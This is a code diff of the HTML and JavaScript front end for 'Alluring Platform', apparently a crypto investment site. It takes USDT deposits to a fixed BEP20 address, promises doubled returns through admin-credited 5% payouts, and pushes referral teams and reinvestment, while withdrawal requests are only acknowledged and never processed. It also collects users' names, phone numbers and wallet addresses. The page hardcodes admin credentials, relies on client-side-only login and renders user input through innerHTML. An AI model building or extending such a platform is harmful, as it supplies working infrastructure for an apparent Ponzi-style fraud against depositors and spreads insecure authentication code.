@@ -1,207 +1,180 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Alluring Platform</title>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Alluring Platform</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 10px; }
-    .box { background: #fff; padding: 15px; margin-bottom: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
-    input, button { width: 100%; padding: 10px; margin-top: 10px; border-radius: 6px; border: 1px solid #ccc; }
-    button { background: #28a745; color: white; border: none; font-weight: bold; cursor: pointer; }
-    button.logout { background: crimson; }
+    body { font-family: Arial, sans-serif; background: #f8f9fa; padding: 10px; }
+    .box { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
+    input, button { width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+    button { background: #28a745; color: #fff; cursor: pointer; }
+    button.logout { background: #dc3545; margin-top: 0; }
     h2, h3 { text-align: center; }
     .hidden { display: none; }
     table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-    td, th { border: 1px solid #ccc; padding: 6px; text-align: left; }
+    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+    th { background: #f1f1f1; }
   </style>
 </head>
 <body>
 
 <div id="loginBox" class="box">
-  <h2>Alluring Platform</h2>
-  <input type="text" id="loginId" placeholder="Enter ID or Admin">
-  <input type="password" id="loginPass" placeholder="Enter Password">
-  <button onclick="login()">Login</button>
+  <h2>Alluring Platform Login</h2>
+  <input id="loginId" type="text" placeholder="User ID or Admin">
+  <input id="loginPass" type="password" placeholder="Password (for admin)">
+  <button onclick="login()">Login / Register</button>
 </div>
 
 <div id="adminPanel" class="box hidden">
   <h2>Admin Panel</h2>
   <button class="logout" onclick="logout()">Logout</button>
-  <div id="adminContent"></div>
+  <div id="adminTable"></div>
 </div>
 
 <div id="userPanel" class="box hidden">
-  <h2>User Dashboard</h2>
+  <h2>Your Dashboard</h2>
   <button class="logout" onclick="logout()">Logout</button>
   <div id="userInfo"></div>
-
-  <h3>Deposit USDT</h3>
-  <p><b>BEP20 USDT Address:</b><br>0x49F7A836A32C1aCF04d4d20Fa87A14C7a19aB74B</p>
-  <input type="number" id="depositAmt" placeholder="Enter amount (50–500 USDT)">
-  <button onclick="depositRequest()">Submit Deposit Request</button>
-
-  <h3>Your Referral Link</h3>
+  <h3>Deposit USDT (50–500)</h3>
+  <p><strong>BEP20 USDT Deposit Address:</strong><br>
+     0x49F7A836A32C1aCF04d4d20Fa87A14C7a19aB74B
+  </p>
+  <input id="depositAmt" type="number" placeholder="Enter Deposit Amount">
+  <button onclick="depositRequest()">Request Deposit</button>
+  <h3>Referral Link</h3>
   <p id="refLink"></p>
-
-  <h3>Wallet Balances</h3>
+  <h3>Balances</h3>
   <p>Income Wallet: <span id="incomeWallet">0</span> USDT</p>
   <p>Referral Wallet: <span id="refWallet">0</span> USDT</p>
-
-  <h3>Withdraw</h3>
-  <input type="number" id="withdrawAmt" placeholder="Enter amount (min 1 USDT)">
-  <button onclick="withdrawRequest()">Submit Withdrawal</button>
-
+  <h3>Withdraw (Min 1 USDT)</h3>
+  <input id="withdrawAmt" type="number" placeholder="Amount">
+  <button onclick="withdrawRequest()">Request Withdraw</button>
   <h3>Your Team</h3>
   <div id="teamList"></div>
-
-  <h3>Reinvestment</h3>
-  <button onclick="reinvest()">Reinvest with New Agent</button>
+  <h3>Reinvest (after reaching 2×)</h3>
+  <button onclick="reinvest()">Reinvest</button>
 </div>
 
 <script>
+const MIN_DP = 50, MAX_DP = 500, MIN_WD = 1;
 let users = JSON.parse(localStorage.getItem("users") || "{}");
-let currentUser = localStorage.getItem("currentUser");
-let isAdmin = localStorage.getItem("isAdmin") === "true";
+let current = localStorage.getItem("current");
+let admin = localStorage.getItem("admin") === "true";
 
-function saveUsers() {
-  localStorage.setItem("users", JSON.stringify(users));
-}
+function save() { localStorage.setItem("users", JSON.stringify(users)); }
 
 function login() {
   let id = document.getElementById("loginId").value.trim();
-  let pass = document.getElementById("loginPass").value.trim();
-  if (id === "admin" && pass === "admin123") {
-    localStorage.setItem("isAdmin", "true");
-    localStorage.setItem("currentUser", "admin");
-    location.reload();
+  let pass = document.getElementById("loginPass").value;
+  if (!id) return alert("Enter your ID.");
+  if (id === 'admin' && pass === 'admin123') {
+    admin = true; current = 'admin';
   } else {
+    admin = false;
     if (!users[id]) {
-      let name = prompt("Enter your name:");
-      let mobile = prompt("Enter your mobile number:");
-      let wallet = prompt("Enter your BEP20 USDT wallet address:");
-      if (!name || !mobile || !wallet) return alert("All fields are required.");
-      users[id] = {
-        name, mobile, wallet,
-        deposit: 0, earnings: 0,
-        referral: 0, withdraw: 0,
-        refBy: new URLSearchParams(location.search).get("ref") || "",
-        team: [], approved: false, active: true, reinvests: 0
-      };
+      const name = prompt("Your Full Name:");
+      const mobile = prompt("Your Mobile Number:");
+      const wallet = prompt("Your BEP20 USDT Wallet Address:");
+      if (!name||!mobile||!wallet) return alert("All fields are required.");
+      users[id] = { name, mobile, wallet, deposit:0, earnings:0, referral:0, team:[], approved:false, active:true, reinvestCount:0, refBy: new URLSearchParams(location.search).get("ref")||"" };
       if (users[id].refBy && users[users[id].refBy]) {
         users[users[id].refBy].team.push(id);
-        users[users[id].refBy].referral += 0;
       }
-      saveUsers();
+      save();
     }
-    localStorage.setItem("isAdmin", "false");
-    localStorage.setItem("currentUser", id);
-    location.reload();
   }
-}
-
-function logout() {
-  localStorage.removeItem("currentUser");
-  localStorage.removeItem("isAdmin");
+  localStorage.setItem("current", id);
+  localStorage.setItem("admin", admin);
   location.reload();
 }
 
-function loadAdminPanel() {
+function logout() {
+  localStorage.removeItem("current");
+  localStorage.removeItem("admin");
+  location.reload();
+}
+
+function loadAdmin() {
   document.getElementById("adminPanel").classList.remove("hidden");
-  let html = `<table><tr><th>ID</th><th>Name</th><th>Deposit</th><th>Earnings</th><th>2x Limit</th><th>Approve</th><th>Add 5%</th></tr>`;
-  for (let id in users) {
-    let u = users[id];
-    html += `<tr>
-      <td>${id}</td>
-      <td>${u.name}</td>
-      <td>${u.deposit}</td>
-      <td>${u.earnings}</td>
-      <td>${u.deposit * 2}</td>
-      <td><button onclick="approveDeposit('${id}')">Approve</button></td>
-      <td><button onclick="addIncome('${id}')">+5%</button></td>
-    </tr>`;
-  }
-  html += `</table>`;
-  document.getElementById("adminContent").innerHTML = html;
+  let html = '<table><tr><th>ID</th><th>Name</th><th>Deposit</th><th>Earnings</th><th>Limit(2×)</th><th>Approve</th><th>Add 5%</th></tr>';
+  Object.entries(users).forEach(([id,u]) => {
+    html += `<tr><td>${id}</td><td>${u.name}</td><td>${u.deposit}</td><td>${u.earnings.toFixed(2)}</td><td>${(u.deposit*2).toFixed(2)}</td>` +
+            `<td><button onclick="approve('${id}')">Approve</button></td>` +
+            `<td><button onclick="add5('${id}')">+5%</button></td></tr>`;
+  });
+  html += '</table>';
+  document.getElementById("adminTable").innerHTML = html;
 }
 
-function approveDeposit(id) {
-  let amt = parseFloat(prompt("Enter deposit amount (50-500):"));
-  if (amt < 50 || amt > 500) return alert("Amount must be between 50–500 USDT.");
-  users[id].deposit = amt;
-  users[id].approved = true;
-  saveUsers();
-  alert("Deposit approved.");
-  loadAdminPanel();
+function approve(id) {
+  const amt = parseFloat(prompt("Approve deposit (50‑500):"));
+  if (amt>=MIN_DP && amt<=MAX_DP) {
+    users[id].deposit = amt;
+    users[id].approved = true;
+    save(); alert("Deposit approved."); loadAdmin();
+  } else alert("Invalid amount.");
 }
 
-function addIncome(id) {
-  let u = users[id];
+function add5(id) {
+  const u = users[id];
   if (!u.approved || !u.active) return alert("Not eligible.");
-  let income = u.deposit * 0.05;
-  if (u.earnings + income >= u.deposit * 2) {
-    u.earnings = u.deposit * 2;
-    u.active = false;
-    alert("User reached 2x. Agreement closed.");
+  const inc = u.deposit * 0.05;
+  if (u.earnings + inc >= u.deposit*2) {
+    u.earnings = u.deposit*2; u.active = false;
+    alert("Reached 2× limit. Agreement closed.");
   } else {
-    u.earnings += income;
+    u.earnings += inc;
     alert("Income added.");
   }
-  saveUsers();
-  loadAdminPanel();
+  save(); loadAdmin();
 }
 
-function loadUserPanel() {
+function loadUser() {
+  const u = users[current];
   document.getElementById("userPanel").classList.remove("hidden");
-  let u = users[currentUser];
   document.getElementById("userInfo").innerHTML = `
     <p><b>Name:</b> ${u.name}</p>
     <p><b>Mobile:</b> ${u.mobile}</p>
     <p><b>Wallet:</b> ${u.wallet}</p>
-    <p><b>Deposit:</b> ${u.deposit} USDT</p>
-    <p><b>Status:</b> ${u.active ? 'Active' : 'Closed'}</p>
-  `;
-  document.getElementById("refLink").innerText = `${location.origin + location.pathname}?ref=${currentUser}`;
-  document.getElementById("incomeWallet").innerText = u.earnings.toFixed(2);
-  document.getElementById("refWallet").innerText = u.referral.toFixed(2);
-  document.getElementById("teamList").innerHTML = u.team.map(id => `<p>${id} - ${users[id]?.name}</p>`).join("");
+    <p><b>Deposit:</b> ${u.deposit}</p>
+    <p><b>Status:</b> ${u.active ? 'Active' : 'Closed'}</p>`;
+  document.getElementById("incomeWallet").textContent = u.earnings.toFixed(2);
+  document.getElementById("refWallet").textContent = u.referral.toFixed(2);
+  document.getElementById("refLink").textContent = `${location.origin + location.pathname}?ref=${current}`;
+  document.getElementById("teamList").innerHTML = u.team.map(i=> `<p>${i} — ${users[i]?.name||''}</p>`).join('');
 }
 
 function depositRequest() {
-  let amt = parseFloat(document.getElementById("depositAmt").value);
-  if (amt < 50 || amt > 500) return alert("Amount must be between 50–500 USDT.");
-  alert("Please send " + amt + " USDT to the deposit address and wait for admin approval.");
+  const val = parseFloat(document.getElementById("depositAmt").value);
+  if (val>=MIN_DP && val<=MAX_DP) alert(`Send ${val} USDT to the deposit address and await admin approval.`);
+  else alert(`Amount must be between ${MIN_DP} and ${MAX_DP} USDT.`);
 }
 
 function withdrawRequest() {
-  let amt = parseFloat(document.getElementById("withdrawAmt").value);
-  if (amt < 1) return alert("Minimum withdrawal is 1 USDT.");
-  alert("Withdrawal request submitted. Admin will process it.");
+  const val = parseFloat(document.getElementById("withdrawAmt").value);
+  if (val>=MIN_WD) alert(`Withdraw request of ${val} USDT sent. Admin will process it.`);
+  else alert(`Minimum withdrawal is ${MIN_WD} USDT.`);
 }
 
 function reinvest() {
-  let user = users[currentUser];
-  if (!user.active && user.deposit > 0) {
-    let newId = currentUser + "_re" + (user.reinvests + 1);
-    users[newId] = {
-      name: user.name, mobile: user.mobile, wallet: user.wallet,
-      deposit: 0, earnings: 0, referral: 0, withdraw: 0,
-      refBy: currentUser, team: [], approved: false, active: true, reinvests: 0
-    };
-    user.reinvests += 1;
-    saveUsers();
-    alert("Reinvested! Your new ID is " + newId);
-  } else {
-    alert("Reinvest available after closing 2x agreement.");
-  }
+  const u = users[current];
+  if (!u.active && u.deposit>0) {
+    const newid = `${current}_r${u.reinvestCount+1}`;
+    users[newid] = { ...u, deposit:0, earnings:0, referral:0, approved:false, active:true, reinvestCount:0, refBy:current, team:[] };
+    u.reinvestCount += 1;
+    save();
+    alert(`Reinvestment account created: ${newid}`);
+  } else alert("Reinvest available only after closing 2× agreement.");
 }
 
-(function init() {
-  if (!currentUser) return;
+(function init(){
+  if (!current) return;
   document.getElementById("loginBox").classList.add("hidden");
-  if (isAdmin) loadAdminPanel();
-  else loadUserPanel();
+  if (admin) loadAdmin();
+  else loadUser();
 })();
 </script>
+
 </body>
-</html>
+  </html>
